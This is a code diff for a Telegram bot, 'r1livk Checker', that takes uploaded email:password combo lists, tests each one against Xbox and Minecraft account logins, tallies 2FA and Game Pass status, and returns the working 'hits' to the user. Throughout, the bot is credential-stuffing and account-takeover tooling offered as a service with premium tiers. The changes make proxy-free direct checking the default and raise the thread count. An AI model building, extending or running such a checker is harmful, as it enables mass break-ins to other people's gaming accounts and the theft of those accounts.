@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Full Power Ultimate Hunter Edition)
+r1livk Checker ⚡ - Telegram Bot (Direct Connection Default Edition)
 """
 
 import os
@@ -25,7 +25,8 @@ STATS_FILE = "user_stats.json"
 
 user_proxies = {}
 user_states = {}
-user_proxy_mode = {} # True = Direct (No Proxy), False = Use Proxies
+# جعلنا القيمة الافتراضية True (أي فحص مباشر بدون بروكسيات تلقائياً)
+user_proxy_mode = {} 
 
 def load_json_data(filepath, default_val):
     if not os.path.exists(filepath):
@@ -61,7 +62,7 @@ def check_user_subscription(user_id):
     return False
 
 REQUEST_TIMEOUT = 25
-MAX_THREADS = 4  
+MAX_THREADS = 6  
 
 active_scans = {}
 user_usage = {}  
@@ -222,7 +223,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
         
     return game_pass_status, owned_games_formatted
 
-def check_single_account(combo, proxy_list=None):
+def check_single_account(combo, proxy_list=None, use_proxy=False):
     parts = combo.split(':')
     if len(parts) < 2:
         return "bad", "Invalid Combo Format"
@@ -231,7 +232,7 @@ def check_single_account(combo, proxy_list=None):
     password = ':'.join(parts[1:]).strip()
     
     proxy_dict = None
-    if proxy_list and len(proxy_list) > 0:
+    if use_proxy and proxy_list and len(proxy_list) > 0:
         import random
         chosen_proxy = random.choice(proxy_list)
         proxy_dict = {
@@ -417,10 +418,11 @@ def show_main_menu(message):
 
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_start = types.InlineKeyboardButton("⚡ Start Heavy Gaming Checker", callback_data="start_checker")
-    btn_proxy = types.InlineKeyboardButton("🚀 Upload & Fast-Filter Proxies", callback_data="upload_proxies_menu")
+    btn_proxy = types.InlineKeyboardButton("🚀 Upload Proxies (Optional)", callback_data="upload_proxies_menu")
     
-    is_direct = user_proxy_mode.get(chat_id, False)
-    proxy_mode_text = "🌐 Mode: Direct (No Proxy) [ON]" if is_direct else "🚀 Mode: Using Proxies [ON]"
+    # الوضع الافتراضي صار مباشر
+    is_direct = user_proxy_mode.get(chat_id, True)
+    proxy_mode_text = "🌐 Mode: Direct Connection (No Proxy) [ON]" if is_direct else "🚀 Mode: Using Proxies [ON]"
     btn_toggle_mode = types.InlineKeyboardButton(proxy_mode_text, callback_data="toggle_proxy_mode")
 
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
@@ -438,12 +440,12 @@ def show_main_menu(message):
 
     p_count = len(user_proxies.get(chat_id, []))
     if is_direct or p_count == 0:
-        proxy_status = "🌐 Status: Direct Connection (No Proxy Active)"
+        proxy_status = "🌐 Status: Direct Connection (Fast & Clean)"
     else:
         proxy_status = f"🚀 Status: Proxies Active ({p_count})"
 
     text = (
-        "⚡ **r1livk Checker - Ultimate Heavy Edition** ⚡\n\n"
+        "⚡ **r1livk Checker - Ultimate Edition** ⚡\n\n"
         "Advanced Xbox & Minecraft Full Hunter.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
@@ -475,7 +477,7 @@ def callback_query(call):
         return
 
     if call.data == "toggle_proxy_mode":
-        current_state = user_proxy_mode.get(chat_id, False)
+        current_state = user_proxy_mode.get(chat_id, True)
         user_proxy_mode[chat_id] = not current_state
         mode_name = "Direct (No Proxy)" if user_proxy_mode[chat_id] else "Proxy Mode"
         bot.answer_callback_query(call.id, f"✅ Switched to: {mode_name}", show_alert=False)
@@ -488,16 +490,16 @@ def callback_query(call):
         btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
         markup.add(btn_cancel)
 
-        is_direct = user_proxy_mode.get(chat_id, False)
+        is_direct = user_proxy_mode.get(chat_id, True)
         p_count = len(user_proxies.get(chat_id, []))
         
         if is_direct or p_count == 0:
-            mode_desc = "🌐 Direct Connection (No Proxy)"
+            mode_desc = "🌐 Direct Connection (No Proxy - Fast)"
         else:
             mode_desc = f"🚀 Active Proxies: {p_count}"
         
         text = (
-            "🎮 **Ultimate Heavy Gaming Mode**\n\n"
+            "🎮 **Ultimate Gaming Mode (Direct Ready)**\n\n"
             f"Current Mode: {mode_desc}\n\n"
             "Send your combo file in `.txt` format (`email:password`)"
         )
@@ -510,8 +512,8 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🚀 **Fast Proxy Filter (High-Speed Only)**\n\n"
-            "Send your `.txt` file containing proxies (`IP:PORT`)."
+            "🚀 **Proxy Upload (Optional)**\n\n"
+            "Send your `.txt` file containing proxies (`IP:PORT`) if you ever want to use them. Otherwise, stay on Direct mode."
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
@@ -557,8 +559,8 @@ def callback_query(call):
     elif call.data == "my_account":
         today = str(date.today())
         p_count = len(user_proxies.get(chat_id, []))
-        is_direct = user_proxy_mode.get(chat_id, False)
-        mode_str = "Direct" if (is_direct or p_count == 0) else f"Proxies ({p_count})"
+        is_direct = user_proxy_mode.get(chat_id, True)
+        mode_str = "Direct (No Proxy)" if (is_direct or p_count == 0) else f"Proxies ({p_count})"
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
             bot.answer_callback_query(call.id, f"Status: Premium / Owner\nMode: {mode_str}", show_alert=True)
         else:
@@ -636,15 +638,15 @@ def handle_docs(message):
             if os.path.exists(local_path): os.remove(local_path)
 
             markup = types.InlineKeyboardMarkup()
-            btn_start = types.InlineKeyboardButton("⚡ Start Ultimate Scan", callback_data="start_checker")
+            btn_start = types.InlineKeyboardButton("⚡ Start Scan", callback_data="start_checker")
             btn_menu = types.InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_menu")
             markup.add(btn_start, btn_menu)
 
             bot.edit_message_text(
-                f"✅ **Fast Proxies Filtered Successfully!**\n\n"
+                f"✅ **Proxies Saved!**\n\n"
                 f"📊 Total Tested: `{total_proxies}`\n"
-                f"🟢 Fast & Working: `{len(working_proxies)}`\n"
-                f"🔴 Dead / Slow Dropped: `{total_proxies - len(working_proxies)}`",
+                f"🟢 Working: `{len(working_proxies)}`\n"
+                f"(ملاحظة: البوت الآن يتيح لك اختيار استخدامها أو إبقائها معطلة من القائمة الرئيسية)",
                 chat_id=chat_id,
                 message_id=msg.message_id,
                 parse_mode="Markdown",
@@ -662,7 +664,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Ultimate Heavy Gaming Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Direct Gaming Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -683,7 +685,7 @@ def process_checker(chat_id, filepath, lines, username):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_UltimateHeavyHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_DirectHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -692,7 +694,7 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **ULTIMATE HEAVY SCAN STATS**\n\n"
+        f"🔥 **DIRECT SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
@@ -706,15 +708,15 @@ def process_checker(chat_id, filepath, lines, username):
 
     lock = threading.Lock()
     
-    is_direct = user_proxy_mode.get(chat_id, False)
-    current_user_proxies = [] if is_direct else user_proxies.get(chat_id, [])
+    is_direct = user_proxy_mode.get(chat_id, True)
+    current_user_proxies = user_proxies.get(chat_id, [])
 
     def worker(combo):
         nonlocal checked, hits, tfa_count, bad, errors, mc_hits, gp_hits, xbox_hits
         if not active_scans.get(chat_id, True):
             return
 
-        status, error_msg = check_single_account(combo, current_user_proxies)
+        status, error_msg = check_single_account(combo, current_user_proxies, use_proxy=not is_direct)
 
         with lock:
             checked += 1
@@ -760,7 +762,7 @@ def process_checker(chat_id, filepath, lines, username):
                 pct = (curr_checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **ULTIMATE HEAVY SCAN (Live)**\n\n"
+                    f"🔥 **DIRECT SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {curr_checked}\n"
                     f"🔒 2FA: {curr_tfa}\n"
@@ -788,7 +790,7 @@ def process_checker(chat_id, filepath, lines, username):
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **ULTIMATE SCAN FINISHED!**\n\n"
+        f"✅ **SCAN FINISHED!**\n\n"
         f"📊 Checked: {checked}\n"
         f"🎯 Heavy Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
@@ -803,7 +805,7 @@ def process_checker(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"🎯 **r1livk Ultimate Heavy Hits ({hits} Hits)**")
+            bot.send_document(chat_id, f, caption=f"🎯 **r1livk Direct Hits ({hits} Hits)**")
         try:
             os.remove(output_filename)
         except:
@@ -813,5 +815,5 @@ def process_checker(chat_id, filepath, lines, username):
         os.remove(filepath)
 
 if __name__ == "__main__":
-    print("r1livk Checker Bot (Ultimate Full Power Edition) is running...")
+    print("r1livk Checker Bot (Direct Mode Default) is running...")
     bot.infinity_polling()
